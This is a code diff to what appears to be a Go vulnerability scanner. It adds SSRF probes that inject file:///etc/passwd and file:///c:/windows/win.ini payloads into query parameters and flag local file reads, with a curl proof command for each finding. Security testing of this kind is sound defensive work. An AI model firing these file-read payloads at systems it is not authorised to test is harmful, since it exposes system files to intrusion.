@@ -280,6 +280,70 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		break
 	}
 
+	// ── Protocol scheme bypass probes ────────────────────────────────────
+	// Some SSRF filters only block http:// URLs. file:// and gopher:// can
+	// bypass these to read local files or interact with internal services.
+	protocolPayloads := []struct {
+		url    string
+		signal string
+		desc   string
+	}{
+		{"file:///etc/passwd", "root:", "local file read via file:// protocol"},
+		{"file:///c:/windows/win.ini", "[fonts]", "local file read via file:// protocol (Windows)"},
+	}
+	for _, param := range probeParams {
+		for _, pp := range protocolPayloads {
+			u := base + "/?" + param + "=" + url.QueryEscape(pp.url)
+			req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
+			if err != nil {
+				continue
+			}
+			req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
+
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+			body, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodySize))
+			resp.Body.Close()
+
+			if resp.StatusCode >= 300 && resp.StatusCode < 400 {
+				continue
+			}
+
+			bodyStr := string(body)
+			if !strings.Contains(bodyStr, pp.signal) {
+				continue
+			}
+
+			findings = append(findings, finding.Finding{
+				CheckID:  finding.CheckWebSSRF,
+				Module:   "deep",
+				Scanner:  scannerName,
+				Severity: finding.SeverityCritical,
+				Title:    fmt.Sprintf("SSRF via %s protocol: parameter %q on %s", strings.SplitN(pp.url, ":", 2)[0], param, asset),
+				Description: fmt.Sprintf(
+					"The parameter %q on %s accepted a %s URL (%s) and returned content "+
+						"indicating %s. The SSRF filter does not block non-HTTP protocol schemes, "+
+						"allowing an attacker to read local files or interact with internal services.",
+					param, asset, strings.SplitN(pp.url, ":", 2)[0], pp.url, pp.desc),
+				Asset:    asset,
+				DeepOnly: true,
+				ProofCommand: fmt.Sprintf(
+					`curl -s --max-redirs 0 "%s/?%s=%s"`,
+					base, param, url.QueryEscape(pp.url)),
+				Evidence: map[string]any{
+					"url":      u,
+					"param":    param,
+					"payload":  pp.url,
+					"protocol": strings.SplitN(pp.url, ":", 2)[0],
+				},
+				DiscoveredAt: time.Now(),
+			})
+			break
+		}
+	}
+
 	return findings, nil
 }
 
